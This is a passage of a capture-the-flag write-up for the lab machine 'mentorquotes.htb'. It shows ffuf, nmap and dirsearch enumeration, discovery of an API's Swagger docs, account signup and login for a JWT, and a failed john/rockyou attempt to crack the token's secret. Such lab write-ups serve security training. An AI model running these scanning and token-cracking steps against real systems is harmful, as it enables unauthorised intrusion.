 <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
 <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span>
 <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
 <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
 <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
 <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">302</span>
<span class="n">________________________________________________</span>

<span class="n">api</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">404</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">22</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">40</span><span class="n">ms</span><span class="p">]</span>
<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1128</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span><span class="m">10</span>.10.11.193
HTTP/1.1<span class="w"> </span><span class="m">302</span><span class="w"> </span>Found
Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">19</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:15:03<span class="w"> </span>GMT
Server:<span class="w"> </span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
Location:<span class="w"> </span>http://mentorquotes.htb/
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1

curl<span class="w"> </span>-I<span class="w"> </span>http://mentorquotes.htb
HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
Date:<span class="w"> </span>Sun,<span class="w"> </span><span class="m">19</span><span class="w"> </span>Feb<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">09</span>:15:04<span class="w"> </span>GMT
Server:<span class="w"> </span>Werkzeug/2.0.3<span class="w"> </span>Python/3.6.9
Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length:<span class="w"> </span><span class="m">5506</span>
</pre></div>
</div>
<p><img alt="index.png" src="../../../../_images/index.png" /></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.10.11.193<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.allports
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-02-16<span class="w"> </span><span class="m">18</span>:31<span class="w"> </span>GMT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>mentorquotes.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.193<span class="o">)</span>
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.037s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65533</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE
<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh
<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http

Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span>.46<span class="w"> </span>seconds
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://mentorquotes.htb

<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>

Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">56158</span>

Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/mentorquotes.htb/_23-02-16_18-28-39.txt

Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-02-16_18-28-39.log

Target:<span class="w"> </span>http://mentorquotes.htb/

<span class="o">[</span><span class="m">18</span>:28:39<span class="o">]</span><span class="w"> </span>Starting:
<span class="o">[</span><span class="m">18</span>:28:47<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>281B<span class="w">  </span>-<span class="w"> </span>/server-status

Task<span class="w"> </span>Completed
</pre></div>
</div>
<p><a class="reference external" href="https://mazinahmed.net/blog/exploiting-misconfigured-apache-server-status-instances/">intersting read</a>  about apache /server-status</p>
<p>This responds 403 though so we may need to bypass the auth first if we are to leverage that
<a class="reference external" href="https://mediatemple.net/community/products/dv/204404734/how-do-i-enable-the-server-status-page-on-my-server">This page</a> is about ways that access to the /server-status page could be restricted</p>
</section>
<section id="api">
<h2>API<a class="headerlink" href="#api" title="Permalink to this heading">#</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[</span><span class="m">20</span>:18:58<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/admin<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/admin/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:18:58<span class="o">]</span><span class="w"> </span><span class="m">422</span><span class="w"> </span>-<span class="w">  </span>186B<span class="w">  </span>-<span class="w"> </span>/admin/
<span class="o">[</span><span class="m">20</span>:18:58<span class="o">]</span><span class="w"> </span><span class="m">422</span><span class="w"> </span>-<span class="w">  </span>186B<span class="w">  </span>-<span class="w"> </span>/admin/?/login
<span class="o">[</span><span class="m">20</span>:18:58<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/admin/backup/<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/admin/backup
<span class="o">[</span><span class="m">20</span>:19:03<span class="o">]</span><span class="w"> </span><span class="m">405</span><span class="w"> </span>-<span class="w">   </span>31B<span class="w">  </span>-<span class="w"> </span>/auth/login
<span class="o">[</span><span class="m">20</span>:19:06<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>969B<span class="w">  </span>-<span class="w"> </span>/docs
<span class="o">[</span><span class="m">20</span>:19:06<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/docs/<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/docs
<span class="o">[</span><span class="m">20</span>:19:15<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>285B<span class="w">  </span>-<span class="w"> </span>/server-status/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:15<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>285B<span class="w">  </span>-<span class="w"> </span>/server-status
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/admin.php<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/admin.php/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login.jsp<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login.jsp/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login.html<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login.html/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">422</span><span class="w"> </span>-<span class="w">  </span>186B<span class="w">  </span>-<span class="w"> </span>/users/
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/admin<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/admin/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login.aspx<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login.aspx/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login.php<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login.php/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:18<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/users/login.js<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/users/login.js/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
<span class="o">[</span><span class="m">20</span>:19:20<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>admin/
<span class="o">[</span><span class="m">20</span>:19:33<span class="o">]</span><span class="w"> </span><span class="m">405</span><span class="w"> </span>-<span class="w">   </span>31B<span class="w">  </span>-<span class="w"> </span>/admin/backup
<span class="o">[</span><span class="m">20</span>:19:33<span class="o">]</span><span class="w"> </span><span class="m">307</span><span class="w"> </span>-<span class="w">    </span>0B<span class="w">  </span>-<span class="w"> </span>/admin/backup/<span class="w">  </span>-&gt;<span class="w">  </span>http://api.mentorquotes.htb/admin/backup
<span class="o">[</span><span class="m">20</span>:19:34<span class="o">]</span><span class="w"> </span><span class="m">422</span><span class="w"> </span>-<span class="w">  </span>186B<span class="w">  </span>-<span class="w"> </span>/admin/check
<span class="o">[</span><span class="m">20</span>:19:52<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>server-status/
<span class="o">[</span><span class="m">20</span>:19:53<span class="o">]</span><span class="w"> </span><span class="m">404</span><span class="w"> </span>-<span class="w">   </span>22B<span class="w">  </span>-<span class="w"> </span>/server-status/%2e%2e//google.com
<span class="o">[</span><span class="m">20</span>:20:18<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>users/
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> \
  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">files</span><span class="o">.</span><span class="n">txt</span> \
  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://api.mentorquotes.htb/FUZZ&quot;</span> \
<span class="o">-</span><span class="n">mc</span> <span class="nb">all</span> \
<span class="o">-</span><span class="n">fc</span> <span class="mi">404</span> 

        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>

       <span class="n">v1</span><span class="mf">.5.0</span> <span class="n">Kali</span> <span class="n">Exclusive</span> <span class="o">&lt;</span><span class="mi">3</span>
<span class="n">________________________________________________</span>

 <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
 <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">.</span><span class="n">mentorquotes</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">/</span>
 <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">words</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span>
 <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
 <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
 <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
 <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">404</span>
<span class="n">________________________________________________</span>

<span class="n">admin</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">422</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">186</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">54</span><span class="n">ms</span><span class="p">]</span>
<span class="n">docs</span>                    <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">307</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">39</span><span class="n">ms</span><span class="p">]</span>
<span class="n">users</span>                   <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">422</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">186</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">33</span><span class="n">ms</span><span class="p">]</span>
<span class="n">quotes</span>                  <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">422</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">99</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">34</span><span class="n">ms</span><span class="p">]</span>
<span class="n">server</span><span class="o">-</span><span class="n">status</span>           <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">403</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">285</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">36</span><span class="n">ms</span><span class="p">]</span>
<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">38267</span><span class="o">/</span><span class="mi">38267</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">494</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
</pre></div>
</div>
<p>Found /docs on the api vhost, this is the swagger docs for the api<br />
<img alt="swagger.png" src="../../../../_images/swagger.png" /></p>
<p><a class="reference external" href="https://www.uvicorn.org/">https://www.uvicorn.org/</a></p>
<p>Creating an account</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/signup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;zoinks@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;zoinkers&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;zoinkers&quot;</span>
<span class="s1">}&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;zoinks@mentorquotes.htb&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;zoinkers&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>And login in</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/login&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;zoinks@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;zoinkers&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;zoinkers&quot;</span>
<span class="s1">}&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&quot;</span>
</pre></div>
</div>
<p>And we get a JWT
<img alt="jwt.png" src="../../../../_images/jwt.png" /></p>
<p>Tried to crack the hash of the jwt real quick, no success.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>jwt2john.py<span class="w"> </span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNzIwMjU3fQ.ZaznY5XPzUXPe6j5wAHBVryjUzQtnZw4XNFRqyXA-2U
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjczNzIwMjU3fQ#65ace76395cfcd45cf7ba8f9c001c156bca353342d9d9c385cd151ab25c0fb65
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>jwt.txt
Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>HMAC-SHA256<span class="w"> </span><span class="o">[</span>password<span class="w"> </span>is<span class="w"> </span>key,<span class="w"> </span>SHA256<span class="w"> </span><span class="m">128</span>/128<span class="w"> </span>ASIMD<span class="w"> </span>4x<span class="o">])</span>
Will<span class="w"> </span>run<span class="w"> </span><span class="m">4</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
0g<span class="w"> </span><span class="m">0</span>:00:00:02<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2023</span>-02-16<span class="w"> </span><span class="m">20</span>:46<span class="o">)</span><span class="w"> </span>0g/s<span class="w"> </span>5538Kp/s<span class="w"> </span>5538Kc/s<span class="w"> </span>5538KC/s<span class="w"> </span><span class="o">(</span>Cahir!!!<span class="o">)</span>..*7¡Vamos!
Session<span class="w"> </span>completed

john<span class="w">  </span>jwt.txt<span class="w"> </span>--show
<span class="m">0</span><span class="w"> </span>password<span class="w"> </span>hashes<span class="w"> </span>cracked,<span class="w"> </span><span class="m">1</span><span class="w"> </span>left
</pre></div>
</div>
<p>users -&gt; only admin has access, including trying to fetch my own user</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-siX<span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/users/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InpvaW5rZXJzIiwiZW1haWwiOiJ6b2lua3NAbWVudG9ycXVvdGVzLmh0YiJ9.Bh1vCttx8SfgZ89fN-51AHW5pwzh_14bt6JnWMJ02EM&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">403</span> <span class="n">Forbidden</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Feb</span> <span class="mi">2023</span> <span class="mi">11</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">42</span> <span class="n">GMT</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">uvicorn</span>
